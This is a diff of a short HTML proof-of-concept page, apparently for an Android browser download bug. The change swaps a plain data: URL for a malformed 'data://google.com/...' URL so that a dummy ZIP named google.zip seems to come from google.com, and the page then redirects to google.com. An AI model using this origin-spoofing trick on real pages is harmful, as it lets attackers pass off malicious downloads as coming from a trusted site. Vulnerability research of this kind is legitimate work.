@@ -2,37 +2,37 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Android ZIP Download PoC</title>
+  <title>ZIP Download with Origin PoC</title>
 </head>
 <body>
 
-<h3>Android ZIP Download PoC</h3>
+<h3>ZIP Download with Spoofed Origin</h3>
 <button id="start">Start</button>
 
 <script>
 document.getElementById('start').addEventListener('click', () => {
   try {
-    // dummy ZIP content (PK header = ZIP signature)
-    const content = "PK\nFake ZIP File\nHello Android\nEND";
-
+    // small base64 dummy
+    const content = "PK\nFake ZIP\nHello Android\nEND";
     const base64 = btoa(content);
 
-    const payload = "data:application/zip;base64," + base64;
+    // ⚠️ key: malformed URL trick
+    const payload = "data://google.com/application/zip;base64," + base64;
 
     // trigger download
     const a = document.createElement('a');
     a.href = payload;
-    a.download = "test.zip";
+    a.download = "google.zip";
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
 
-    console.log("ZIP download triggered");
+    console.log("ZIP download triggered with spoofed origin");
 
-    // redirect setelah download
+    // redirect after download
     setTimeout(() => {
       location.href = "https://google.com";
-    }, 400);
+    }, 500);
 
   } catch(e) {
     console.error(e);
